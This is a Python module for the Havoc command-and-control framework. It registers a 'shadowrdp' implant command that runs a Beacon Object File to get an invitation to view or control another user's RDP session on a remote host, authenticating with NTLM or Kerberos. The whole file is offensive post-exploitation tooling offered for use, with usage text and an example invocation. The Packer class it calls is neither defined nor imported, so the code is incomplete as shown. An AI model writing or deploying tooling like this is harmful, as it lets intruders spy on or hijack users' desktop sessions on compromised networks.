from havoc import Demon, RegisterCommand, RegisterModule
from os.path import exists
from struct import pack, calcsize

def shadowrdp( demonID, *params ):
    packer = Packer()
    demon = Demon(demonID)
    num_params = len(params)
    if num_params != 4:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Not enough parameters")
        return False
    TaskID = demon.ConsoleWrite(demon.CONSOLE_TASK, f"Tasked demon shadowrdp by c3r3br4t3")

    packer.addstr(params[0])
    packer.addstr(params[1])
    packer.addstr(params[2])
    packer.addstr(params[3])

    if demon.ProcessArch == "x64":
        demon.InlineExecute(TaskID, "go", "shadowrdp.x64.bof.o", packer.getbuffer(), False)
    else:
        demon.ConsoleWrite(demon.CONSOLE_ERROR, "Architecture not supported")
        return False
    return TaskID

RegisterCommand( shadowrdp, "", "shadowrdp", "Obtain invitation for remote session", 0, """<hostname> [<control>|<view>] <sessionid> [<NTLM>|<KERBEROS>]
                    HOSTNAME             Required. The remote hostname.
                    [<control>|<view>]   Required. Control level over remote session.
                    SESSIONID            Required. Target session id.
                    [<NTLM>|<KERBEROS>]  Required. Authentication protocol to use.""", "hostname control 1 NTLM" )